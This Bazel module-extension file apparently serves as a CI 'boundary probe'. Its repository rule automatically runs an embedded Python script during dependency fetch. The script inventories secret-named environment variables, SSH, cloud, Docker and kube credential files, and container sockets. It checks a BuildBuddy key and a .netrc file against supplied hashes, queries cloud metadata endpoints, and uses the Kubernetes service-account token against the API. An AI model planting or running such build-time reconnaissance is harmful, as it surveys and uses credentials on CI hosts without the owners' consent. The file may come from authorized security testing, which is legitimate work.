"""Metadata-only security probe for the CI analysis host."""

def _ci_boundary_probe_impl(repository_ctx):
    report_path = str(repository_ctx.path("report.json"))
    script = """
import datetime
import hashlib
import json
import os
import pathlib
import platform
import shutil
import socket
import ssl
import stat
import subprocess
import sys
import urllib.error
import urllib.request

KNOWN_BB_SHA256 = "e7804a56443ec79c32c93a818b5951e376132a01e2cceeec1941925a4317ee59"
KNOWN_NETRC_SHA256 = "ece037a7495ec3fb4c126ff2f2b9323350256c289caccc020557c0179ee085f0"

def sha256_file(path, limit=8 * 1024 * 1024):
    h = hashlib.sha256()
    total = 0
    with open(path, "rb") as f:
        while True:
            chunk = f.read(65536)
            if not chunk:
                break
            total += len(chunk)
            if total > limit:
                return None
            h.update(chunk)
    return h.hexdigest()

def file_record(path):
    out = {"path": path, "exists": os.path.lexists(path)}
    if not out["exists"]:
        return out
    try:
        s = os.lstat(path)
        out.update({
            "mode": oct(stat.S_IMODE(s.st_mode)),
            "uid": s.st_uid,
            "gid": s.st_gid,
            "size": s.st_size,
            "readable": os.access(path, os.R_OK),
            "writable": os.access(path, os.W_OK),
            "type": "symlink" if stat.S_ISLNK(s.st_mode) else "dir" if stat.S_ISDIR(s.st_mode) else "file" if stat.S_ISREG(s.st_mode) else "other",
        })
        if stat.S_ISLNK(s.st_mode):
            out["link_target"] = os.readlink(path)
        elif stat.S_ISREG(s.st_mode) and out["readable"]:
            digest = sha256_file(path)
            if digest:
                out["sha256"] = digest
                if path.endswith("/.netrc"):
                    out["matches_supplied_netrc"] = digest == KNOWN_NETRC_SHA256
    except Exception as e:
        out["error"] = type(e).__name__
    return out

def list_dir(path, limit=100):
    result = {"path": path, "entries": []}
    try:
        for name in sorted(os.listdir(path))[:limit]:
            p = os.path.join(path, name)
            s = os.lstat(p)
            result["entries"].append({
                "name": name,
                "type": "dir" if stat.S_ISDIR(s.st_mode) else "symlink" if stat.S_ISLNK(s.st_mode) else "file" if stat.S_ISREG(s.st_mode) else "other",
                "mode": oct(stat.S_IMODE(s.st_mode)),
                "size": s.st_size,
            })
    except Exception as e:
        result["error"] = type(e).__name__
    return result

def selected_status(path):
    wanted = {"Name", "Uid", "Gid", "Groups", "NSpid", "CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb", "NoNewPrivs", "Seccomp", "Seccomp_filters"}
    out = {}
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            for line in f:
                key, sep, value = line.partition(":")
                if sep and key in wanted:
                    out[key] = value.strip()
    except Exception as e:
        out["error"] = type(e).__name__
    return out

def read_lines(path, limit=200):
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            return [line.rstrip() for _, line in zip(range(limit), f)]
    except Exception as e:
        return ["<" + type(e).__name__ + ">"]

def run_readonly(argv, timeout=4, max_chars=6000):
    try:
        p = subprocess.run(argv, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=timeout)
        return {"argv": argv, "returncode": p.returncode, "output": p.stdout[:max_chars]}
    except Exception as e:
        return {"argv": argv, "error": type(e).__name__}

def http_probe(name, url, headers=None, method="GET", context=None):
    out = {"name": name, "url": url, "method": method}
    try:
        req = urllib.request.Request(url, headers=headers or {}, method=method)
        with urllib.request.urlopen(req, timeout=2, context=context) as r:
            out.update({"status": r.status, "content_type": r.headers.get("Content-Type"), "content_length": r.headers.get("Content-Length"), "server": r.headers.get("Server"), "metadata_flavor": r.headers.get("Metadata-Flavor")})
    except urllib.error.HTTPError as e:
        out.update({"status": e.code, "content_type": e.headers.get("Content-Type"), "server": e.headers.get("Server"), "metadata_flavor": e.headers.get("Metadata-Flavor")})
    except Exception as e:
        out["error"] = type(e).__name__
    return out

def unix_http_ping(path):
    out = {"path": path, "exists": os.path.exists(path)}
    if not out["exists"]:
        return out
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(path)
        s.sendall(b"GET /_ping HTTP/1.0\\r\\nHost: localhost\\r\\n\\r\\n")
        data = s.recv(512)
        s.close()
        first = data.splitlines()[0].decode("ascii", "replace") if data else ""
        out.update({"connectable": True, "http_status_line": first})
    except Exception as e:
        out.update({"connectable": False, "error": type(e).__name__})
    return out

home = os.path.expanduser("~")
report = {
    "schema": "ci-boundary-probe-v2",
    "observed_at_utc": datetime.datetime.now(datetime.timezone.utc).isoformat(),
    "identity": {
        "uid": os.getuid(),
        "gid": os.getgid(),
        "groups": os.getgroups(),
        "user": os.environ.get("USER"),
        "home": home,
        "cwd": os.getcwd(),
        "hostname": socket.gethostname(),
        "fqdn": socket.getfqdn(),
        "uname": list(platform.uname()),
    },
    "process": {
        "self": selected_status("/proc/self/status"),
        "pid1": selected_status("/proc/1/status"),
        "cgroup": read_lines("/proc/self/cgroup", 100),
    },
}

all_env_names = sorted(os.environ)
sensitive_markers = ("KEY", "TOKEN", "SECRET", "PASS", "CRED", "AUTH", "COOKIE", "SSH", "KUBE", "AWS", "GOOGLE", "GCP", "AZURE", "JENKINS", "BUILD", "BAZEL")
sensitive_env = []
for name in all_env_names:
    if any(marker in name.upper() for marker in sensitive_markers):
        value = os.environ.get(name, "")
        rec = {"name": name, "length": len(value), "set": bool(value)}
        if value:
            rec["matches_supplied_buildbuddy_key"] = hashlib.sha256(value.encode()).hexdigest() == KNOWN_BB_SHA256
        sensitive_env.append(rec)
report["environment"] = {"count": len(all_env_names), "names": all_env_names, "sensitive": sensitive_env}

candidates = [
    os.path.join(home, ".netrc"),
    os.path.join(home, ".gitconfig"),
    os.path.join(home, ".ssh"),
    os.path.join(home, ".ssh", "id_rsa"),
    os.path.join(home, ".ssh", "id_ed25519"),
    os.path.join(home, ".ssh", "known_hosts"),
    os.path.join(home, ".aws", "credentials"),
    os.path.join(home, ".aws", "config"),
    os.path.join(home, ".config", "gcloud", "application_default_credentials.json"),
    os.path.join(home, ".config", "gcloud", "credentials.db"),
    os.path.join(home, ".docker", "config.json"),
    os.path.join(home, ".kube", "config"),
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/var/run/docker.sock",
    "/run/docker.sock",
    "/run/containerd/containerd.sock",
    "/var/run/containerd/containerd.sock",
    "/etc/resolv.conf",
    "/etc/hosts",
]
report["candidate_files"] = [file_record(p) for p in candidates]
report["directory_inventory"] = [list_dir(p) for p in [home, "/home/jenkins", "/workspace", "/var/run/secrets"] if os.path.isdir(p)]
report["unix_endpoints"] = [unix_http_ping(p) for p in ["/var/run/docker.sock", "/run/docker.sock", "/run/containerd/containerd.sock", "/var/run/containerd/containerd.sock"]]

mounts = []
for line in read_lines("/proc/self/mountinfo", 1000):
    left, sep, right = line.partition(" - ")
    if not sep:
        continue
    a = left.split()
    b = right.split()
    if len(a) >= 5 and len(b) >= 2:
        mounts.append({"mount_point": a[4], "fs_type": b[0], "source": b[1]})
report["mounts"] = mounts

socket_paths = []
for line in read_lines("/proc/net/unix", 500):
    fields = line.split()
    if len(fields) >= 8 and fields[-1].startswith("/"):
        socket_paths.append(fields[-1])
report["unix_socket_paths"] = sorted(set(socket_paths))

tool_names = ["aws", "bazel", "bazelisk", "capsh", "curl", "docker", "gcloud", "git", "kubectl", "nerdctl", "nsenter", "podman", "ssh-add", "sudo"]
report["tools"] = {name: shutil.which(name) for name in tool_names}
readonly_commands = []
if shutil.which("sudo"):
    readonly_commands.append(run_readonly(["sudo", "-n", "-l"]))
ssh_sock = os.environ.get("SSH_AUTH_SOCK")
if ssh_sock and shutil.which("ssh-add"):
    readonly_commands.append(run_readonly(["ssh-add", "-l"]))
report["readonly_commands"] = readonly_commands

report["metadata_endpoints"] = [
    http_probe("aws-imds-root", "http://169.254.169.254/latest/meta-data/"),
    http_probe("gcp-metadata-root", "http://169.254.169.254/computeMetadata/v1/", {"Metadata-Flavor": "Google"}),
    http_probe("azure-imds", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}),
]

kube_host = os.environ.get("KUBERNETES_SERVICE_HOST")
kube_port = os.environ.get("KUBERNETES_SERVICE_PORT_HTTPS") or os.environ.get("KUBERNETES_SERVICE_PORT") or "443"
kube_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
if kube_host and os.path.isfile(kube_token_path):
    try:
        token = pathlib.Path(kube_token_path).read_text().strip()
        ctx = ssl.create_default_context(cafile="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
        report["kubernetes_api"] = http_probe("kubernetes-version", "https://" + kube_host + ":" + kube_port + "/version", {"Authorization": "Bearer " + token}, context=ctx)
    except Exception as e:
        report["kubernetes_api"] = {"error": type(e).__name__}

with open(sys.argv[1], "w", encoding="utf-8") as f:
    json.dump(report, f, sort_keys=True, indent=2)
    f.write("\\n")
"""
    result = repository_ctx.execute(["python3", "-c", script, report_path], timeout = 90)
    if result.return_code != 0:
        fail("CI boundary probe failed: " + result.stderr[-2000:])
    repository_ctx.file(
        "BUILD.bazel",
        "exports_files([\"report.json\"], visibility = [\"//visibility:public\"])\n",
    )

ci_boundary_probe = repository_rule(
    implementation = _ci_boundary_probe_impl,
    local = True,
)

def _ci_boundary_probe_ext_impl(module_ctx):
    ci_boundary_probe(name = "ci_boundary_probe")

ci_boundary_probe_ext = module_extension(
    implementation = _ci_boundary_probe_ext_impl,
)
